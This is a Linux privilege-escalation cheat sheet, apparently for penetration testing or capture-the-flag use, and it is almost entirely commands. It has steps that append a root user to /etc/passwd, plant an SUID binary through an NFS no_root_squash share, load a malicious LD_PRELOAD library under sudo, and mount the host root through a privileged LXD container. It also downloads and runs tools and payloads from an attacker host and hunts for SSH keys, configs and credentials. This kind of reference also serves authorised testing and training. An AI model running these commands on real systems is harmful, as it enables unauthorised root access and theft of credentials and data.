# Linux Privilege Escalation Guide

A comprehensive guide for escalating privileges on Linux systems. This guide covers initial shell stabilization, system enumeration, file and permission checks, and exploitation techniques. Commands are designed for a Linux low-privilege shell, typically Bash, unless specified otherwise. Always stabilize your shell first to ensure reliable command execution.

## Table of Contents
- [Shell Stabilization](#stabilizing-the-shell)
- [Initial Enumeration](#initial-enumeration)
- [User and Group Checks](#current-user-and-groups)
- [System Checks](#environment-variables)
- [File System Enumeration](#file-and-directory-enumeration)
- [Permission Checks](#permission-and-capability-checks)
- [Service Monitoring](#service-and-process-monitoring)
- [Network Exploitation](#network-and-service-exploitation)
- [File Operations](#file-transfer-capabilities)
- [Exploitation Techniques](#advanced-exploitation-techniques)
- [Automated Tools](#automated-tools)
- [Additional Checks](#additional-checks)
- [Resources](#resources)
- [Pro Tips](#pro-tips)

## Stabilizing the Shell

Upon gaining a low-privilege shell, stabilize it for better interaction:

```bash
python -c 'import pty; pty.spawn("/bin/bash")' || python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
```

**Background the shell, adjust terminal settings, and bring it back:**

```bash
Ctrl + Z
stty raw -echo; fg; reset
stty columns 200 rows 200
```

## Initial Enumeration

### System Information
Gather kernel and OS details for exploit compatibility:

```bash
uname -a
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
```

## Current User and Groups

Identify user context and group memberships:

```bash
whoami
id
groups <USER>
sudo -l
ls -lsaht /etc/sudoers
```

## Environment Variables

Check for misconfigured PATH or sensitive data:

```bash
env
echo $PATH
```

> **Reference:** Linux Privilege Escalation Using PATH Variable

## Running Processes

Identify processes, especially those running as root:

```bash
ps aux | grep -i 'root' --color=auto
ps au
```

## Network Information

Understand network connections and listening services:

```bash
netstat -antup
netstat -tunlp
```

## File and Directory Enumeration

### User Home Directories

Check for accessible files or SSH keys:

```bash
cd /home/
ls -lsaht
ls -lsaR /home/ | grep -i '\.ssh'
```

### Web Configurations

Look for credentials in web server configs:

```bash
cd /var/www/html/
ls -lsaht
find /var/www -name "*.conf" 2>/dev/null
```

### System Configuration Files

Inspect `/etc/` for misconfigurations or credentials:

```bash
cd /etc/
ls -lsaht
ls -lsaht | grep -i '\.conf' --color=auto
ls -lsaht | grep -i '\.secret' --color=auto
```

### Temporary and Shared Directories

Check writable directories for potential persistence:

```bash
ls -lsaht /tmp/
ls -lsaht /var/tmp/
ls -lsaht /dev/shm/
```

### Other Key Directories

Explore for sensitive data or misconfigurations:

```bash
ls -lsaht /var/lib/
ls -lsaht /var/db/
ls -lsaht /opt/
```

### Mail

Check for user mailboxes containing sensitive information:

```bash
cd /var/mail/
ls -lsaht
```

### Config Files

Search for configuration files system-wide:

```bash
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

## Permission and Capability Checks

### SUID Binaries

Find binaries with the SUID bit set:

```bash
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

> **Reference:** [GTFOBins](https://gtfobins.github.io/) for SUID exploitation.

### SGID Binaries

Find binaries with the SGID bit set:

```bash
find / -perm -g=s -type f 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

### File Capabilities

Check for binaries with granted capabilities:

```bash
getcap -r / 2>/dev/null
```

### World-Writable Files and Directories

Find writable files and directories:

```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

### Writable /etc/passwd

If writable, add a privileged user:

```bash
openssl passwd -1 -in <PASSWORD>
echo 'manoj:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:manoj:/home/manoj:/bin/bash' >> /etc/passwd
su manoj
```

## Service and Process Monitoring

### Monitor System Activity

Use `pspy` to monitor processes and cron jobs:

```bash
cd /var/tmp/
wget http://<ATTACKER_IP>/pspy32 || wget http://<ATTACKER_IP>/pspy64
chmod 755 pspy32 pspy64
./pspy64 -pf -i 1000
```

> **Reference:** [pspy GitHub](https://github.com/DominicBreuker/pspy/blob/master/README.md)

### Cron Jobs

Check for misconfigured cron jobs:

```bash
cat /etc/crontab
ls -lsaht /etc/cron.*
ls -la /etc/cron.daily
crontab -u root -l
```

## Network and Service Exploitation

### NFS Shares

Check for weak NFS permissions:

```bash
cat /etc/exports
showmount -e <TARGET_IP>
```

Exploit `no_root_squash` on attacker machine:

```bash
mkdir -p /mnt/nfs/
mount -t nfs -o vers=3 <TARGET_IP>:<NFS_SHARE> /mnt/nfs/ -nolock
gcc suid.c -o suid
cp suid /mnt/nfs/
chmod u+s /mnt/nfs/suid
```

On target:
```bash
./suid
```

### MySQL Unauthorized Access

Test for default or weak credentials:

```bash
mysql -uroot -p
# Try: root, toor, <empty>
```

### Port Forwarding

Forward loopback services using Meterpreter:

```bash
meterpreter> portfwd add -l 139 -p 139 -r <TARGET_IP>
meterpreter> background
msf> use exploit/linux/samba/trans2open
msf> set RHOSTS 0.0.0.0
msf> set RPORT 139
msf> run
```

## File Transfer Capabilities

Test available tools for file transfer:

```bash
which wget
which curl
which nc
which ncat
which nc.traditional
which socat
which fetch
ls -lsaht /bin/ | grep -i 'ftp' --color=auto
```

Example with `wget`:
```bash
wget http://<ATTACKER_IP>/payload
```

## Compilation and Exploit Development

### Check Compilation Tools

Verify available compilers:

```bash
which gcc
which cc
which python
which perl
```

### System Architecture

Determine binary architecture:

```bash
file /bin/bash
```

### Compile Exploits

Compile a kernel exploit:

```bash
gcc kernel_exploit.c -o kernel_exploit
```

### Shared Libraries

Create a malicious shared library for LD_PRELOAD:

```bash
gcc src.c -fPIC -shared -o /tmp/root.so
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

## Advanced Exploitation Techniques

### PATH Manipulation

Add current directory to PATH for privilege escalation:

```bash
PATH=.:${PATH}
```

### LXD/LXC Containers

Exploit privileged LXD containers:

```bash
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
```

### Tcpdump Privilege Escalation

Exploit tcpdump if SUID:

```bash
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

### Shared Tmux Session

Create a shared tmux session for privilege escalation:

```bash
tmux -S /shareds new -s debugsess
```

## Automated Tools

### LinPEAS

Enumerate system misconfigurations:

```bash
wget http://<ATTACKER_IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

> **Reference:** [LinPEAS GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

### Traitor

Exploit common misconfigurations:

```bash
wget http://<ATTACKER_IP>/traitor
chmod +x traitor
./traitor
```

> **Reference:** [Traitor GitHub](https://github.com/liamg/traitor)

### Lynis

Perform a system audit:

```bash
./lynis audit system
```

> **Reference:** [Lynis GitHub](https://github.com/CISOfy/lynis)

## Additional Checks

### Unmounted Filesystems

Check for unmounted drives:

```bash
lsblk
cat /etc/fstab
```

### Bash History

Review user command history:

```bash
history
cat ~/.bash_history
```

### Shared Objects

Check dependencies of a binary:

```bash
ldd /bin/ls
readelf -d /bin/ls | grep PATH
```

### User-Created Files

Find files owned by a specific user:

```bash
find / -user <USERNAME> 2>/dev/null
```

## Resources

- GTFOBins: SUID/SGID binary exploitation
- pspy: Process monitoring
- Attacking NFS Shares: NFS exploitation
- Metasploit Unleashed: Metasploit techniques

## Pro Tips

- Always transfer and run `pspy` to monitor system activity in real-time
- Prioritize SUID binaries and writable `/etc/passwd` for quick wins
- Use `LinPEAS` or `Traitor` for automated enumeration to save time
- Check `/tmp`, `/var/tmp`, and `/dev/shm` for writable storage to stage payloads
